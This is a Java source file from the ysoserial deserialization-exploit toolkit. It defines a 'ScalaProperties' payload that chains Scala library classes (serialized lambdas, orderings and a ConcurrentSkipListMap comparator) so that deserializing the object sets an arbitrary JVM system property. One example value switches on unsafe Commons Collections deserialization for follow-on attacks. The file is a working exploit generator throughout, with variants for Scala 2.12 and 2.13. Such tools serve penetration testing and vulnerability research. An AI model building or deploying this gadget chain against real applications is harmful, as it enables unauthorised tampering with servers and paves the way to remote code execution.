package ysoserial.payloads;

import scala.Function1;
import scala.None$;
import scala.Tuple2;
import scala.math.Ordering;
import scala.reflect.ClassTypeManifest;
import scala.sys.SystemProperties;
import sun.reflect.ReflectionFactory;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.StubClassConstructor;

import java.io.*;
import java.lang.invoke.MethodHandleInfo;
import java.lang.invoke.SerializedLambda;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.concurrent.ConcurrentSkipListMap;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"org.scala-lang:scala-library:2.13.6"})
@Authors({ Authors.ARTSPLOIT }) //the gadget chain originally discovered by jarij https://hackerone.com/reports/1529790
public class ScalaProperties extends PayloadRunner implements ObjectPayload<Object> {


    //private static Object createFuncFromSerializedLambda(SerializedLambda serialized) throws IOException, ClassNotFoundException {
    //    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    //    ObjectOutputStream oos = new ObjectOutputStream(baos);
    //    oos.writeObject(serialized);
    //
    //    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
    //    return ois.readObject();
    //}

    // For scala version 2.13.x
    private static Object createSetSystemPropertyGadgetScala213(String key, String value) throws Exception {
        ReflectionFactory rf =
            ReflectionFactory.getReflectionFactory();

        Tuple2 prop = new scala.Tuple2<>(key, value);

        // Should be: 142951686315914362
        long versionUID = ObjectStreamClass.lookup(scala.Tuple2.class).getSerialVersionUID();
        System.out.println("VersionUID: " + versionUID);

        SerializedLambda lambdaSetSystemProperty = new SerializedLambda(scala.sys.SystemProperties.class,
            "scala/Function0", "apply", "()Ljava/lang/Object;",
            MethodHandleInfo.REF_invokeStatic, "scala.sys.SystemProperties",
            "$anonfun$addOne$1", "(Lscala/Tuple2;)Ljava/lang/String;",
            "()Lscala/sys/SystemProperties;", new Object[]{prop});

        Method readResolve = lambdaSetSystemProperty.getClass().getDeclaredMethod("readResolve");
        readResolve.setAccessible(true);

        Class<?> clazz = Class.forName("scala.collection.View$Fill");
        Constructor<?> ctor = clazz.getConstructor(int.class, scala.Function0.class);
        Object view = ctor.newInstance(1, readResolve.invoke(lambdaSetSystemProperty));

        clazz = Class.forName("scala.math.Ordering$IterableOrdering");
        // create a constructor with no arguments for the Ordering$IterableOrdering class
        ctor = rf.newConstructorForSerialization(
            clazz, StubClassConstructor.class.getDeclaredConstructor()
        );

        Object iterableOrdering = ctor.newInstance();

        // on readObject, ConcurrentSkipListMap invokes comparator.compare(Object x, Object y);
        // Initialize ConcurrentSkipList with a dummy comparator (a comparator that allows putting values into the list)
        ConcurrentSkipListMap map = new ConcurrentSkipListMap((o1, o2) -> 1);

        // add the view entry to the map, when the view.iterable().next() is invoked, the System.setProperty lambda is executed
        map.put(view, 1);
        map.put(view, 2);

        // Replace the comparator with the IterableComparator
        // IterableComparator is responsible for executing the view.iterable().next() on comparison
        Field f = map.getClass().getDeclaredField("comparator");
        f.setAccessible(true);
        f.set(map, iterableOrdering);
        return map;
    }

    // For scala version 2.12.x
    static Object createSetSystemPropertyGadgetScala212(String key, String value) throws Exception {
        ReflectionFactory rf =
            ReflectionFactory.getReflectionFactory();

        Tuple2 prop = new Tuple2<>(key, value);

        // Create lambda that sets the system property
        SerializedLambda lambdaSetSystemProperty = new SerializedLambda(SystemProperties.class,
            "scala/Function0", "apply", "()Ljava/lang/Object;",
            MethodHandleInfo.REF_invokeStatic, "scala.sys.SystemProperties",
            "$anonfun$$plus$eq$1", "(Lscala/Tuple2;)Ljava/lang/String;",
            "()Lscala/sys/SystemProperties;", new Object[]{prop});

        // Create lambda that wraps single argument lambda to zero argument lambda
        SerializedLambda lambdaWrapFn1ToFn0 = new SerializedLambda(scala.Array.class,
            "scala/Function1", "apply", "(Ljava/lang/Object;)Ljava/lang/Object;",
            MethodHandleInfo.REF_invokeStatic, "scala.Array$",
            "$anonfun$fill$1$adapted", "(ILscala/Function0;Lscala/reflect/ClassTag;Ljava/lang/Object;)Ljava/lang/Object;",
            "(Ljava/lang/Object;)[Ljava/lang/Object;",
            new Object[]{1, lambdaSetSystemProperty,
                new ClassTypeManifest(None$.MODULE$, Object.class, null)});

        // Invokes Function1.apply method on element comparison "compare(Object x, Object y)"
        Class<?> clazz = Class.forName("scala.math.Ordering$$anon$5");
        Constructor<?> ctor = clazz.getConstructor(Ordering.class, Function1.class);

        // Create ordering object without invoking the constructor
        ctor = rf.newConstructorForSerialization(
            clazz, StubClassConstructor.class.getDeclaredConstructor()
        );

        Method readResolve = lambdaWrapFn1ToFn0.getClass().getDeclaredMethod("readResolve");
        readResolve.setAccessible(true);

        // Set the f$2 field to fn1
        Ordering<?> ordering = (Ordering<?>) ctor.newInstance();
        Field f = ordering.getClass().getDeclaredField("f$2");
        f.setAccessible(true);
        f.set(ordering, readResolve.invoke(lambdaWrapFn1ToFn0));

        // on readObject, ConcurrentSkipListMap invokes comparator.compare(Object x, Object y);
        // therefore, set the comparator to "ordering"
        ConcurrentSkipListMap<Integer, Integer> map = new ConcurrentSkipListMap();

        // add some dummy entries to the map
        // "scala.Array$$anonfun$fill$1$adapted" requires that the map key is java.lang.Integer
        map.put(1, 1);
        map.put(2, 2);

        // set the comparator to "ordering"
        // This has to be done after populating the map because the comparator is called on "map.put"
        // The "ordering" comparator throws an exception, so the "map.put" would fail
        f = map.getClass().getDeclaredField("comparator");
        f.setAccessible(true);
        f.set(map, ordering);
        return lambdaSetSystemProperty;
    }

    public Object getObject(final String command) throws Exception {

        //e.g command = "org.apache.commons.collections.enableUnsafeSerialization:true");
        String[] nameValue = command.split(":");
        return createSetSystemPropertyGadgetScala213(nameValue[0], nameValue[1]);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(ScalaProperties.class, args);
    }
}
